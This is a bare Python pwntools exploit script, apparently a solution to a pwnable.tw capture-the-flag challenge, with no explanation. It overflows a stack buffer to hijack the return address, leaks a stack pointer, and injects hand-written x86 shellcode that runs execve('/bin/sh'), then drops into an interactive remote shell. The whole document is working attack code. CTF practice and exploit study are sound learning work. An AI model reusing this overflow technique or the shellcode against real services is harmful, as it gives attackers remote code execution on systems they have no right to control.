from pwn import *

context.log_level = 'debug'
p = remote('chall.pwnable.tw', 10000)

payload = p32(0x41414141)*5 + p32(0x8048087)
p.sendafter(':', payload)

stack_leak = u32(p.recv(4))
stack_input = stack_leak - 0x4

log.success(hex(stack_input))

payload = p32(0x42424242)*5 + p32(0x8048091)
p.send(payload)

payload = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80' + b'C'*18 + p32(stack_input)
p.send(payload)

p.interactive()
